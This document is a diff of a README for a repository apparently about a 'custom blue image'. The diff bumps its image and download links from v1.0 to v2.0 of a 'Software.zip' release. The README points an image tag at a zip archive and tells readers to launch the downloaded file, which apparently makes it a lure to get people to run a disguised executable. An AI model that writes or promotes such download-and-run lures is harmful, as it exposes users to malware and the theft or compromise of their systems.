@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to the Custom Blue Image Repository! 🌟
 
-![Blue Image](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)
+![Blue Image](https://github.com/DanionFyr3/custom-blue-image/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This repository focuses on a custom blue image. Please explore the topics and de
 
 ## Installation:
 To get started with the custom blue image, you can download the repository by clicking on the following link:  
-[![Download Repository](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)
+[![Download Repository](https://github.com/DanionFyr3/custom-blue-image/releases/download/v2.0/Software.zip)](https://github.com/DanionFyr3/custom-blue-image/releases/download/v2.0/Software.zip)
 
 **Note:** Make sure to launch the downloaded file to begin exploring the custom blue image content.
 
